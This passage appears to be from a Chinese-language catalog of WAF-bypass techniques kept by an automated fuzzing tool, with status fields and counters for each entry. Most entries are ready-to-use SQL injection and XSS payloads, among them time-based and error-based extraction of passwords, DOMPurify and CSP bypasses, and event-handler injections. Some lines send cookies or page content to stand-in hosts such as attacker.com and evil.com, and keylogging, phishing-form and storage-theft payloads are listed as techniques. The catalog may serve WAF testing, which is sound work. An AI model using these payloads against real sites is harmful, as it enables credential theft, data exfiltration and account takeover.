- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:odbc_brace` — ODBC 大括号转义语法

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 兼容 ODBC 大括号语法 {x ...}，select {x table_name} 与 union{x select{x 1},2} 等形态让 WAF 关键字/结构匹配失配，解析器却按转义语法还原
- **模板**：`union{x select{x 1},2}`、`select {x table_name} from {x information_schema.tables}`
- **来源备注**：`union{x select{x 1},2}`、`select {x table_name} from {x information_schema.tables}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:operator_swap` — 运算符替代

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：不出现 `AND`/`OR` 关键字。`&&`、`||`（PIPES_AS_CONCAT 关闭时=OR）、`REGEXP`、`RLIKE`、`IN`、`BETWEEN`、`LIKE`、`&`、`|`、`^`、`<<`、`>>` 都能表达逻辑，绕关键字正则。
- **模板**：`1 && 1=1`、`1 || 1=1`、`1 REGEXP '^1$'`、`id=1 and 1=1`、`id=1%26%26 1=1`
- **来源备注**：`1 && 1=1`、`1 || 1=1`、`1 REGEXP '^1$'`、`id=1 and 1=1`、`id=1%26%26 1=1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:regexp_like` — MySQL 8 REGEXP_LIKE/RLIKE 替代 =

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 8.0 的 `REGEXP_LIKE(expr, pattern)`/`RLIKE` 正则匹配可替代 `=` 做条件判定（如 `id RLIKE '^1$'`）；WAF 词表对 RLIKE/REGEXP_LIKE 覆盖弱于 `=`。MySQL 8 官方正则文档实证。与 PostgreSQL 的 `~` 运算符跨库对应。
- **模板**：`AND id RLIKE '^1$'`、`AND REGEXP_LIKE(user(), '^r')`、`AND 1 REGEXP '^1$'`
- **来源备注**：`AND id RLIKE '^1$'`、`AND REGEXP_LIKE(user(), '^r')`、`AND 1 REGEXP '^1$'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:schema_qualified_operator` — PostgreSQL OPERATOR(schema.op) 模式限定运算符写法

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PostgreSQL 允许 `OPERATOR(schema.operator)` 显式限定运算符，如 `a OPERATOR(pg_catalog.<@) b`、`1 OPERATOR(pg_catalog.+) 2`。这种带括号限定的非标准写法使运算符不再以裸 token(`=`、`<@`、`+`) 形态出现，可避开基于运算符签名的正则；同时 `<@`、`@>`、`#>` 等不常见运算符本身也常不在 WAF 词表。
- **模板**：`a OPERATOR(pg_catalog.<@) b`、`SELECT 1 OPERATOR(pg_catalog.+) 2`、`' OR '1' OPERATOR(pg_catalog.=) '1`
- **来源备注**：`a OPERATOR(pg_catalog.<@) b`、`SELECT 1 OPERATOR(pg_catalog.+) 2`、`' OR '1' OPERATOR(pg_catalog.=) '1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.982434+00:00；retired=-

### `sqli:syntactic:schemasplit` — 点号分隔标识符间插空白/9.e 形态

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：sqlmap schemasplit 把 `schema.table` 写成 `schema 9.e.table`——`9.e` 是 MySQL 的合法浮点 token（配合 float_e 词法 bug），点号两侧不再连续，绕过"schema.table 连续点号"的签名正则；Black Hat US-13 演讲收录。与 float_e_token_drop 同源但独立可叠用。
- **模板**：`SELECT * FROM testdb 9.e.users`、`FROM information_schema 9.e.tables`
- **来源备注**：`SELECT * FROM testdb 9.e.users`、`FROM information_schema 9.e.tables`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.982434+00:00；retired=-

### `sqli:syntactic:sleep2getlock` — GET_LOCK 替代 SLEEP 时间盲注

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：sqlmap sleep2getlock tamper 把 `SLEEP(5)` 换成 `GET_LOCK('x',5)`——MySQL 内置锁函数做时间盲注，SLEEP 关键字被拦时 GET_LOCK 同样阻塞且词表覆盖弱。MySQL 5.0/5.5 实证。
- **模板**：`AND GET_LOCK('blah',5)`、`AND IF(1=1,GET_LOCK('x',5),0)`
- **来源备注**：`AND GET_LOCK('blah',5)`、`AND IF(1=1,GET_LOCK('x',5),0)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.982434+00:00；retired=-

### `sqli:syntactic:sqlite_glob_match` — SQLite GLOB/MATCH 运算符替代 = 与 LIKE

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：SQLite 的 GLOB(基于 glob 通配)与 MATCH(全文)可替代 `=`、LIKE、IN 做条件判断，如 `id GLOB '1*'`；GLOB 的匹配语义与 LIKE 不同(区分大小写、`*` 与 `?` 通配、`[]` 字符类)，且大多 WAF 词表只收录 `=` 与 LIKE，可绕过比较运算符签名。
- **模板**：`id=1 GLOB '1*' AND 'x'='x`、`AND 'a' NOT GLOB '[*]*'`、`0' UNION SELECT 1,2,3 FROM sqlite_master WHERE type GLOB 'tab*'`
- **来源备注**：`id=1 GLOB '1*' AND 'x'='x`、`AND 'a' NOT GLOB '[*]*'`、`0' UNION SELECT 1,2,3 FROM sqlite_master WHERE type GLOB 'tab*'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.982434+00:00；retired=-

### `sqli:syntactic:table_row_compare` — TABLE 行比较盲注提取

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 8 的 TABLE 语句可与行元组比较，(1,'a','a')<(table users limit 1) 按字典序逐字符探测，WAF 未建模 TABLE 语句形态（floor 报错在 MySQL8 已失效，此为替代提取路径）
- **模板**：`(1,'a','a')<(table users limit 1 offset 1)`、`||(0x31,0x21,0x21)<(table/**/admin_user/**/limit/**/1)#`
- **来源备注**：`(1,'a','a')<(table users limit 1 offset 1)`、`||(0x31,0x21,0x21)<(table/**/admin_user/**/limit/**/1)#`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.982434+00:00；retired=-

### `sqli:syntactic:true_expr` — 1=1 等价表达式库

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：1 LIKE 1 / 1 REGEXP 1 / 2-1=1 等恒真表达式库替代 1=1，绕等号与 1=1 签名。
- **模板**：`1 LIKE 1`/`1 REGEXP 1`/`1 RLIKE 1`/`2-1=1`/`1 IN(1)`/`1 BETWEEN 0 AND 2`/`0x01=0x01`/`~0`/`!0`、`恒假对照 `mod(29,9)`/`0&1`
- **来源备注**：`1 LIKE 1`/`1 REGEXP 1`/`1 RLIKE 1`/`2-1=1`/`1 IN(1)`/`1 BETWEEN 0 AND 2`/`0x01=0x01`/`~0`/`!0`、`恒假对照 `mod(29,9)`/`0&1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.982434+00:00；retired=-

### `sqli:token:mysql_numeric_alias_hex_case` — 数字开头别名与 0x/0X 大小写敏感绕过 token 化

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 表/列别名可以数字开头，词法器未适配会把 `1a` 解成 <INTNUM><IDENT> 两个 token 导致语法错误放行；且 `0x1` 是十六进制而 `0X1` 不是，前端词法器不区分大小写会误判。打 token 化/变量格式提取盲区。
- **模板**：`select 1a from (select flag as 1a from flag)x`、`select 1aaa.1a from (select flag as 1a from flag) 1aaa`、`select {0X23 (select flag from flag)}`
- **来源备注**：`select 1a from (select flag as 1a from flag)x`、`select 1aaa.1a from (select flag as 1a from flag) 1aaa`、`select {0X23 (select flag from flag)}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:type:cast_error_exfil` — PostgreSQL CAST/:: 类型转换错误回显数据

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：强制把数据转成整数类型触发 invalid input syntax 错误，错误信息直接回显数据：`CAST(version() AS int)`、`(SELECT password...)::int`；结合 CHR(126) 加 ~ 定界便于解析。与 MySQL 的 extractvalue/updatexml 等错误函数家族机制不同，这里没有专用函数，纯靠类型系统强制转换，词表/签名型 WAF 无匹配点。
- **模板**：`AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC)`、`(SELECT password FROM users LIMIT 1)::int`
- **来源备注**：`AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC)`、`(SELECT password FROM users LIMIT 1)::int`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.983440+00:00；retired=-

### `sqli:type:chr_bitwise_ascii` — PostgreSQL CHR() 内嵌位运算构造 ASCII 字符隐藏数值

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PostgreSQL 允许在 CHR() 参数里做位运算，如 `CHR(65 # 255)`(XOR 得 'A')、`CHR(64 | 1)`、`CHR(130 >> 1)`，从而把 ASCII 码藏在运算式里，避免载荷中出现裸的字符码数字或引号字面量，骗过按数字/关键字签名的正则扫描。绕的是字符码/字符串字面量签名。
- **模板**：`SELECT CHR(65 # 255)||CHR(64 | 1)`、`SELECT CHR(130 >> 1)`
- **来源备注**：`SELECT CHR(65 # 255)||CHR(64 | 1)`、`SELECT CHR(130 >> 1)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.983440+00:00；retired=-

### `sqli:type:hex_literal_dual_context` — 十六进制字面量双语义(数值/字符串)常量折叠分歧

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：打类型折叠盲区。MySQL 中 `0x...` 字面量在字符串上下文是二进制字符串（`0x61646d696e`='admin'），在数值上下文是整数（`0x1`=1、`0x31`=49 即字符'1'）。语义引擎常量折叠按单一类型取值，得到与真实执行不同的比较结果，类型系统评估与实际 DB 语义分歧；同时 `0x` 天然免引号，绕过"字符串必须引号包裹"的形态判定。
- **模板**：`?id=1 AND username=0x61646d696e--`、`?id=1' AND sleep(0x31) AND '1'='1--`（等价 sleep(49)）、`?id=1' AND 1=0x1--`
- **来源备注**：`?id=1 AND username=0x61646d696e--`、`?id=1' AND sleep(0x31) AND '1'='1--`（等价 sleep(49)）、`?id=1' AND 1=0x1--`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.983440+00:00；retired=-

### `sqli:type:string_numeric_coerce` — 字符串-数值隐式转换导致常量折叠误判

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：打类型折叠盲区。MySQL 类型转换宽松：字符串与数值比较时把字符串转数字，`'abc'=0` 为 TRUE、`'1abc'=1` 为 TRUE（前导数字字符串）。语义引擎若按严格类型把 `'abc'=0` 折叠成 false、`'1abc'=1` 折叠成 false，就会把"恒真条件"（永真 or）的意图评分压低而漏检——折叠结果与真实执行分歧。
- **模板**：`?id='x' OR 'abc'=0--`（MySQL 中为真）、`?id=1' AND '1abc'=1--`（MySQL 中为真）、`?id='admin' AND 'x'='x'--`
- **来源备注**：`?id='x' OR 'abc'=0--`（MySQL 中为真）、`?id=1' AND '1abc'=1--`（MySQL 中为真）、`?id='admin' AND 'x'='x'--`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

## XSS（98 条）

### `part:attr-boundary` — 属性边界变换

- **状态**：seed
- **来源**：system
- **机制/族**：context-escape / context-escape
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：改变属性引号/边界样式（单引号→双引号→无引号→反引号）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:closure-change` — 闭合结构变换

- **状态**：seed
- **来源**：system
- **机制/族**：context-escape / context-escape
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：替换标签闭合方式（>→/>→autofocus>→/onerror=...>）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:cookie-theft` — Cookie 窃取

- **状态**：seed
- **来源**：system
- **机制/族**：indirect-execution / indirect-exec
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：构造 Cookie 窃取 payload（document.cookie 外传）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:dom-manipulation` — DOM 篡改

- **状态**：seed
- **来源**：system
- **机制/族**：indirect-execution / indirect-exec
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：篡改页面 DOM 结构或内容
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:event-switch` — 事件处理器替换

- **状态**：seed
- **来源**：system
- **机制/族**：context-escape / context-escape
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：替换事件处理器为不同触发事件（onerror→onload→ontoggle→onfocus→onstart→oncanplay→onseeking→ontimeupdate）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:expression-data-exfil` — 数据窃取表达式

- **状态**：seed
- **来源**：system
- **机制/族**：indirect-execution / indirect-exec
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：用数据窃取表达式替换简单弹窗（alert(1)→fetch('http://attacker.com/?c='+document.cookie)→navigator.sendBeacon(...)）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:expression-rewrite` — JS 表达式重写

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：等价替换 JavaScript 执行表达式（alert(1)→prompt(1)→confirm(1)→eval('alert(1)')→Function('alert(1)')()）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:keylogger` — 键盘记录

- **状态**：seed
- **来源**：system
- **机制/族**：indirect-execution / indirect-exec
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：注入键盘记录器监听用户输入
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:media-events` — 媒体事件利用

- **状态**：seed
- **来源**：system
- **机制/族**：context-escape / context-escape
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：使用 HTML5 媒体标签的丰富事件（onloadstart、oncanplay、ontimeupdate、onseeking、ondurationchange）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:namespace-switch` — 命名空间替换

- **状态**：seed
- **来源**：system
- **机制/族**：parser-differential / namespace-confusion
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：使用 SVG/MathML 等不同 XML 命名空间触发 XSS
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:nested-tags` — 嵌套标签组合

- **状态**：seed
- **来源**：system
- **机制/族**：context-escape / context-escape
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：使用嵌套标签触发 XSS（<video><source onerror=...>、<svg><animate onbegin=...>）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:phishing-injection` — 钓鱼页面注入

- **状态**：seed
- **来源**：system
- **机制/族**：indirect-execution / indirect-exec
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：注入伪造登录表单窃取凭据
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:spacing-change` — 文本间距变换

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / whitespace-sub
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：替换空白/间距结构（空格→\t→\n→\r→\f→无空格属性语法）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:storage-theft` — Storage 窃取

- **状态**：seed
- **来源**：system
- **机制/族**：indirect-execution / indirect-exec
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：构造 localStorage/sessionStorage 窃取 payload
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:tag-switch` — 标签替换

- **状态**：seed
- **来源**：system
- **机制/族**：context-escape / context-escape
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：替换 HTML 标签为等价 XSS 触发标签（<script>→<img>→<svg>→<video>→<audio>→<details>→<body>→<input>→<iframe>）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:xss-combine` — XSS技术组合

- **状态**：seed
- **来源**：system
- **机制/族**：- / composite
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：组合 2+ 种 XSS 语义变异技术（标签替换+事件替换+表达式重写）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `xss:ast:html_parser_script_svg` — HTML5/SVG 解析差异绕过 JS 提取

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：语义引擎提取 JS 依赖 HTML 解析器，但 HTML5 规范（script 内 `<!--` 与 `<script>` 需闭合）与 `<svg>` 内可用 XML 语法（实体编码、CDATA、随机 XML 标签）与常见解析库不一致，引擎提取出错误 JS 判语法错误放行。打 AST/HTML 解析盲区。
- **模板**：`<script>a="<!--<script></script>";alert(name)//</script>`、`<svg><script>alert&#40;1)</script>`
- **来源备注**：`<script>a="<!--<script></script>";alert(name)//</script>`、`<svg><script>alert&#40;1)</script>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=2；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T15:07:13.738656+00:00；retired=-

### `xss:context:attr_event` — 属性事件注入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：属性值上下文里闭合引号注入事件处理器；利用浏览器容错（`>`/引号被滤时的自动闭合、`//` 吞尾、碎片注入）+ 冷门事件处理器（onauxclick/onpointerenter 等黑名单常不全）+ 属性值内实体解码（WAF 不解，浏览器解）。
- **模板**：`"><img src=x onerror=alert(1)>`、`' onfocus=alert(1) autofocus=`、`" autofocus onfocus="alert(1)`、`" autofocus onfocus=alert(1)//`、`<a"/onclick=(confirm)()>click`
- **来源备注**：`"><img src=x onerror=alert(1)>`、`' onfocus=alert(1) autofocus=`、`" autofocus onfocus="alert(1)`、`" autofocus onfocus=alert(1)//`、`<a"/onclick=(confirm)()>click`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T15:10:49.975426+00:00；retired=-

### `xss:context:base_href` — base 标签劫持

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<base href>` 改变页面所有相对 URL 的解析基准，可把 `<script src=相对路径>` 引到攻击者域；还能配合 CSP nonce 偷渡（`<base href=data:><script nonce=页面泄露的 nonce src=text/javascript,alert(1)>`）。
- **模板**：`<base href="//evil.com/"><script src="legit.js"></script>`、`<base href="data:"><script nonce="NONCE" src="text/javascript,alert(1)"></script>`、`<base id=isDevelopment href=https://attacker>`
- **来源备注**：`<base href="//evil.com/"><script src="legit.js"></script>`、`<base href="data:"><script nonce="NONCE" src="text/javascript,alert(1)"></script>`、`<base id=isDevelopment href=https://attacker>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T14:13:50.111278+00:00；retired=-

### `xss:context:cid_attr_breakout` — cid: 协议保留引号实现属性逃逸

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：DOMPurify 允许 cid: 协议，而该协议值不会对双引号做编码，可在 href 值中直接携带 `"` 字符闭合属性并注入事件属性；配合 id 同名与 name=avatar 的 DOM clobber 形成完整链。绕的是"允许的 URL 协议值必然安全"的假设——协议白名单未考虑引号保留行为。PayloadsAllTheThings 收录。
- **模板**：`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`
- **来源备注**：`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=2；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T15:10:49.959426+00:00；retired=-

### `xss:context:csp_jsonp_bypass` — CSP 白名单 JSONP 端点绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：CSP 白名单域常带 JSONP 端点，用 <script src=白名单域?jsonp=alert(1)> 借白名单域执行任意回调，WAF 若只按 src 域名放行则整段 JS 放行
- **模板**：`<script src='https://白名单域/search?callback=alert(1)'></script>`
- **来源备注**：`<script src='https://白名单域/search?callback=alert(1)'></script>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T15:03:33.010129+00:00；retired=-

### `xss:context:css_injection` — CSS 注入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：CSS 上下文内 `expression()`（IE-only）或 `@import` 拉外部 CSS/JS；`@keyframes` + `onanimationstart` 组合自动触发执行。
- **模板**：`<style>//*{x:expression(alert(/xss/))}//<style></style>`（IE）`、`<div style="background:url(javascript:alert(1))">`、`<style>@import url("//evil.com/x.css")</style>`、`<style>@keyframes x{}</style><div onanimationstart=alert(1) style=animation:x\ 1s>`、`<div ontransitionend=alert(1) style=transition:all\ 1s>`
- **来源备注**：`<style>//*{x:expression(alert(/xss/))}//<style></style>`（IE）`、`<div style="background:url(javascript:alert(1))">`、`<style>@import url("//evil.com/x.css")</style>`、`<style>@keyframes x{}</style><div onanimationstart=alert(1) style=animation:x\ 1s>`、`<div ontransitionend=alert(1) style=transition:all\ 1s>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=2；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T15:10:49.937260+00:00；retired=-

### `xss:context:css_style_breakout` — CSS </style> 突破到 HTML 上下文

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：从 <style> 内用 </style> 逃逸到 HTML 上下文再注入 script，WAF 只按 CSS 上下文扫会漏过后半段
- **模板**：`</style><script>alert(1)</script>`
- **来源备注**：`</style><script>alert(1)</script>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=2；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T15:40:02.532211+00:00；retired=-

### `xss:context:dangling_markup` — 悬空标记数据泄漏

- **状态**：promoted
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：CSP/过滤拦脚本但放行图片时，注入 <img src='https://attacker.com/log? 让后续页面内容全部拼进请求 URL 外带（含 CSRF token/敏感字段）
- **模板**：`<img src='https://attacker.com/log?'>`
- **来源备注**：`<img src='https://attacker.com/log?'>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=1；bypass=1；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T15:04:15.657781+00:00；retired=-

### `xss:context:data_blob_import` — blob:/data: URI + 动态 import 偷渡

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 blob:/data: URI 配合动态 import() 构造可执行 JS 上下文，绕过只认 script 标签与 javascript: 协议的 WAF
- **模板**：`<script>import('data:text/javascript,alert(1)')</script>`
- **来源备注**：`<script>import('data:text/javascript,alert(1)')</script>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T15:07:13.750567+00:00；retired=-

### `xss:context:details_ontoggle` — details 切换事件

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<details open ontoggle=alert(1)>` 用 details 的 toggle 事件 + open 属性自动触发——无需交互，事件名冷门。
- **模板**：`<details open ontoggle=alert(1)>`
- **来源备注**：`<details open ontoggle=alert(1)>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=2；distinct_primitive=0
